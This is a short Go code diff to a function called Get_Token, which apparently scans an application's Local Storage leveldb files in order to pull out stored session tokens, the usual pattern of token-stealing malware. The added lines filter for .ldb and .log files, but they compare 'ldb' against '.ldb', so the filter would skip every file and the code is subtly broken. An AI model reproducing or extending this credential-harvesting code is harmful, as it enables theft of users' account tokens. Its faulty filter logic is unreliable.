@@ -220,6 +220,9 @@ func Get_Token() []string {
 		}
 		println("Local Storage files found!")
 		for _, f := range files {
+			if strings.Split(f.Name(), ".")[1] != ".ldb" && strings.Split(f.Name(), ".")[1] != ".log" {
+				continue
+			}
 			println("Checking file " + f.Name() + "...")
 			file_local_storage, err := os.Open(s.path + "\\Local Storage\\leveldb\\" + f.Name())
 			if err != nil {
